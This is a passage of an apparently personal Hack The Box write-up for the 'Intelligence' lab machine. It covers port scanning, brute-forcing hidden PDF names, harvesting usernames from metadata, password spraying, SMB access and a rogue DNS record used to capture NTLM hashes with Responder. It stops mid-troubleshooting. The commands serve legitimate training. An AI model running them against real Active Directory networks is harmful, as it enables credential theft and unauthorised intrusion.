---
description: https://app.hackthebox.com/machines/357
---

# Intelligence

<figure><img src="../../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

I start by doing a Nmap -p- without anything to know all the ports open, then throw in a big command to properly enumerate the open ports to win some time:

```
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3269,3268,5985,9389,49667,49691,49692,49709,49713,54414 10.129.44.184
```

<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

I then go on the http webpage on port 80 and use feroxbuster:

```
feroxbuster -u http://intelligence.htb -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

<figure><img src="../../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

the /documents is forbidden ->

<figure><img src="../../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

but the subdomains are not

<figure><img src="../../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>

Nothing to see in the first place but then I saw that this was a PDF and not a txt oriented file, let's see if there is exif data ->

```
exiftool 2020-01-01-upload.pdf 
```

<figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>

there was another PDF in the subdomains ->

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Ok so we get 2 possible users? Let's continue enumeration:

```
kerbrute userenum --dc 10.129.44.184 -d intelligence.htb users
```

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

No we need to check to see if either has the don’t require preauth flag set, which would leak the users hash (this is AS-REP-roasting):

```
GetNPUsers.py -no-pass -dc-ip 10.129.44.184 intelligence.htb/Jose.Williams
GetNPUsers.py -no-pass -dc-ip 10.129.44.184 intelligence.htb/William.Lee
```

<figure><img src="../../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

That got me thinking that the PDFs are named based on the date they were created. So, we can conclud that we could potentially bruteforce the PDF names and download them that are not referenced in the website.

So we create a little script in python or bash to follow the nomenclature of the website:

```
#!/bin/bash
DATE=2020-01-01

for i in {0..366}
do
       NEXT_DATE=$(date +%Y-%m-%d -d "$DATE + $i day")
          echo "$NEXT_DATE""-upload"
      done
```

```
chmod +x dates4bruteforce.sh
./dates4bruteforce.sh > pdfname
```

<figure><img src="../../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

and the one-liner to go and bruteforce and download all of this:

```
for i in $(cat ../pdfname); do wget http://10.129.44.184/documents/$i".pdf"; done
```

i made a folder to store all of the PDF's

<figure><img src="../../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

after manually looking we find a PDF with default password:

<figure><img src="../../../.gitbook/assets/image (674).png" alt=""><figcaption><p>NewIntelligenceCorpUser9876</p></figcaption></figure>

We can easily say to ourselves that there is Exif data on all of them with valid users, we need to script it out:

```
find . *.pdf|xargs exiftool |grep Creator|awk '{print $3}' >  userPDF.txt
```

<figure><img src="../../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

So now we can spray this password to see if anyone left it by default:

```
crackmapexec smb 10.129.44.184 -u userPDF.txt -p NewIntelligenceCorpUser9876 --continue-on-success
```

<figure><img src="../../../.gitbook/assets/image (676).png" alt=""><figcaption><p>Tiffany.Molina</p></figcaption></figure>

So this _**Tiffany.Molina**_ user left password by default

Now let's try to dig out on the SMB side of the user:

```
smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.129.44.184
```

<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

and then we connect in the Users share:

```
smbclient -U Tiffany.Molina //10.129.44.184/Users NewIntelligenceCorpUser9876
```

And pull the user flag out of the Desktop:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

further enumeration led to going in the IT share ->

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

We find this PowerShell script:

<figure><img src="../../../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>

> The script goes into LDAP and gets a list of all the computers, and then loops over the ones where the name starts with “web”. It will try to issue a web request to that server (with the running users’s credentials), and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.

<figure><img src="../../../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

> in theory, if we can add a DNS record that starts with `web`, which points to a machine that we control, then we can potentially get the NTLM hash of the user, the script is running as!

`dnstool.py` is a script that comes with [Krbrelayx](https://github.com/dirkjanm/krbrelayx)&#x20;

before interacting with Kerberos, we have to make sure that our machine’s time is in sync with the target machine. Generally, we can use things like Nmap output, HTTP header etc to determine the target’s time and change our machine time with `date` command.

```
sudo ntpdate 10.129.44.184
```

<figure><img src="../../../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>

then we go and interract ->

```
python dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r webfelix.intelligence.htb -a add -d 10.10.14.166 10.129.44.184
```

* `-u`: This option specifies the username for authentication. In this case, the username is `intelligence.htb\\Tiffany.Molina`.
* `-p`: This option specifies the password for authentication. Here, the password is `NewIntelligenceCorpUser9876`.
* `-r`: This option specifies the remote DNS server to which the tool will connect. Here, the remote DNS server is `webfelix.intelligence.htb`.
* `-a`: This option specifies the action to perform. The value `add` indicates that a new DNS record will be added.
* `-d`: This option specifies the IP addresses for the DNS record. In this case, the IP addresses are `10.10.14.166` and `10.129.44.184`. in summary, this command is attempting to add a new DNS record to the `webfelix.intelligence.htb` remote DNS server using the provided username and password, with the new DNS record pointing to the IP addresses `10.10.14.166` and `10.129.44.184`.

<figure><img src="../../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>

Okay, we successfully add a new record, next →

when I launch my responder, I get this error →

```
responder -I tun0
```

<figure><img src="../../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>

So I check which program is currently running on this port:

```
netstat -tuln
```

<figure><img src="../../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>

i can get more info on what's running with the following command

```
sudo lsof -i :80
```
